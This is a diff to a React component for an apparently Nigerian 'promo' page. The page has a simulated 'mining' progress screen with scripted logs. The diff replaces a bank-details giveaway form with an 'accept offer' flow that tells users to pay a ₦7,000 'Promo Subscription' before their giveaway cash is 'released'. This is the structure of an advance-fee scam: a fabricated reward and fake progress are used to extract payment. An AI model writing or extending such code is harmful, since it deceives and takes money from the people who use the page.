@@ -9,14 +9,16 @@ interface PromoPageProps {
   user: User;
   onUpdateUser: (updated: User) => void;
   onBack: () => void;
+  onGoToSubscribe?: () => void;
 }
 
-const PromoPage: React.FC<PromoPageProps> = ({ user, onUpdateUser, onBack }) => {
+const PromoPage: React.FC<PromoPageProps> = ({ user, onUpdateUser, onBack, onGoToSubscribe }) => {
   const [miningState, setMiningState] = useState<'idle' | 'mining' | 'success'>('idle');
   const [mineReward, setMineReward] = useState<number>(0);
   const [countdownText, setCountdownText] = useState<string>('');
   const [miningProgress, setMiningProgress] = useState(0);
   const [miningLogs, setMiningLogs] = useState<string[]>([]);
+  const [acceptedOffer, setAcceptedOffer] = useState(false);
   
   // Giveaway Form Settings
   const { unlocked: giveawayUnlocked, loading: giveawayLoading } = useGiveawayStatus();
@@ -75,23 +77,21 @@ const PromoPage: React.FC<PromoPageProps> = ({ user, onUpdateUser, onBack }) => 
     ];
 
     let currentStep = 0;
+    let progressVal = 0;
     const progressInterval = setInterval(() => {
-      setMiningProgress((prev) => {
-        const nextProgress = prev + 2;
-        
-        // Add periodic logs
-        if (nextProgress % 20 === 0 && currentStep < logMessages.length) {
-          setMiningLogs((prevLogs) => [...prevLogs, logMessages[currentStep]]);
-          currentStep++;
-        }
+      progressVal += 2;
+      setMiningProgress(progressVal);
+      
+      // Add periodic logs
+      if (progressVal % 20 === 0 && currentStep < logMessages.length) {
+        setMiningLogs((prevLogs) => [...prevLogs, logMessages[currentStep]]);
+        currentStep++;
+      }
 
-        if (nextProgress >= 100) {
-          clearInterval(progressInterval);
-          finishMining();
-          return 100;
-        }
-        return nextProgress;
-      });
+      if (progressVal >= 100) {
+        clearInterval(progressInterval);
+        finishMining();
+      }
     }, 100);
   };
 
@@ -332,73 +332,54 @@ const PromoPage: React.FC<PromoPageProps> = ({ user, onUpdateUser, onBack }) => 
             <div className="space-y-4">
               <div className="bg-gradient-to-r from-amber-500/10 via-orange-500/5 to-transparent border border-amber-500/20 p-4 rounded-xl text-left">
                 <p className="text-[11px] text-gray-300 leading-relaxed font-bold">
-                  🎉 Giveaways are currently <span className="text-amber-400 font-black uppercase">UNLOCKED!</span> Complete the details below now to put in your immediate giveaway claim!
+                  🎉 Giveaways are currently <span className="text-amber-400 font-black uppercase">UNLOCKED!</span> Complete the verification terminal to capture your random giveaway cash bounty.
                 </p>
               </div>
 
-              {giveawayStatus === 'success' ? (
-                <div className="p-4 bg-green-500/5 border border-green-500/20 rounded-xl text-center space-y-2">
-                  <Icons.CheckCircle className="text-green-500 mx-auto" size={32} />
-                  <p className="text-xs text-gray-300 leading-relaxed font-semibold">{statusMessage}</p>
+              {!acceptedOffer ? (
+                <div className="space-y-4">
+                  <div className="p-4 bg-amber-500/5 border border-amber-500/20 rounded-xl space-y-3 text-center">
+                    <p className="text-xs text-gray-400 leading-relaxed font-bold">
+                       You have active eligibility for a verified Promo Giveaway cash allotment. Click the button below to accept the immediate offer and receive transfer instructions.
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => {
+                      setAcceptedOffer(true);
+                    }}
+                    className="w-full py-4 bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-black font-black text-xs uppercase tracking-widest rounded-xl transition-all shadow-[0_0_20px_rgba(241,196,15,0.2)] active:scale-95 flex items-center justify-center space-x-2"
+                  >
+                    <Icons.Gift size={16} />
+                    <span>ACCEPT OFFER / ACCEPT OFERR</span>
+                  </button>
                 </div>
               ) : (
-                <form onSubmit={handleSubmitGiveaway} className="space-y-3">
-                  <div className="space-y-1 text-left">
-                    <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-1">Bank Name</label>
-                    <input 
-                      type="text" 
-                      placeholder="e.g. PalmPay, Kuda, Zenith Bank" 
-                      value={bankName}
-                      onChange={(e) => setBankName(e.target.value)}
-                      disabled={giveawayStatus === 'submitting'}
-                      className="w-full bg-black border border-gray-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-amber-500 transition-colors font-semibold"
-                    />
+                <div className="space-y-4">
+                  <div className="p-5 bg-zinc-900 border border-amber-500/20 rounded-2xl space-y-4 text-left font-sans">
+                    <div className="flex items-center space-x-2 text-amber-400 font-black text-xs uppercase tracking-wider">
+                      <Icons.Star size={16} />
+                      <span>PROMO DESK INSTRUCTION</span>
+                    </div>
+                    <div className="text-xs text-zinc-300 space-y-3 font-bold leading-relaxed">
+                      <p>
+                        To finalize your request, please go to the subscription page and select the <span className="text-amber-400 font-black uppercase">Promo Subscription of 7,000 Naira (₦7000)</span> where you can subscribe for once withdrawal.
+                      </p>
+                      <p className="text-[10px] text-zinc-500 leading-normal font-medium">
+                        Your giveaway reward voucher and associated account balances will be released to your designated banking profile upon one-time settlement activation.
+                      </p>
+                    </div>
                   </div>
-
-                  <div className="space-y-1 text-left">
-                    <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Number</label>
-                    <input 
-                      type="text" 
-                      placeholder="10-Digit Account Number" 
-                      maxLength={10}
-                      value={accountNumber}
-                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
-                      disabled={giveawayStatus === 'submitting'}
-                      className="w-full bg-black border border-gray-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-amber-500 transition-colors font-mono font-bold"
-                    />
-                  </div>
-
-                  <div className="space-y-1 text-left">
-                    <label className="text-[9px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Beneficiary Name</label>
-                    <input 
-                      type="text" 
-                      placeholder="Enter Full Account Name" 
-                      value={accountName}
-                      onChange={(e) => setAccountName(e.target.value)}
-                      disabled={giveawayStatus === 'submitting'}
-                      className="w-full bg-black border border-gray-800 rounded-xl px-4 py-3 text-xs text-white focus:outline-none focus:border-amber-500 transition-colors font-semibold"
-                    />
-                  </div>
-
-                  {giveawayStatus === 'error' && (
-                    <p className="text-[10px] text-red-500 font-bold ml-1">{statusMessage}</p>
+                  
+                  {onGoToSubscribe && (
+                    <button
+                      onClick={onGoToSubscribe}
+                      className="w-full py-3.5 bg-green-glow text-black font-extrabold text-xs uppercase tracking-widest rounded-xl transition-all hover:bg-emerald-400 active:scale-95 flex items-center justify-center space-x-2"
+                    >
+                      <span>Go to Subscription Page</span>
+                      <Icons.ChevronRight size={14} />
+                    </button>
                   )}
-
-                  <button
-                    type="submit"
-                    disabled={giveawayStatus === 'submitting'}
-                    className="w-full py-3.5 bg-amber-500 hover:bg-amber-600 text-black font-extrabold text-xs uppercase tracking-widest rounded-xl transition-all shadow-md active:scale-95 flex items-center justify-center space-x-2"
-                  >
-                    {giveawayStatus === 'submitting' ? (
-                      <>
-                        <div className="w-3 h-3 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
-                        <span>Acquiring Claim Slot...</span>
-                      </>
-                    ) : (
-                      <span>Request Giveaway Payment</span>
-                    )}
-                  </button>
-                </form>
+                </div>
               )}
             </div>
           )}
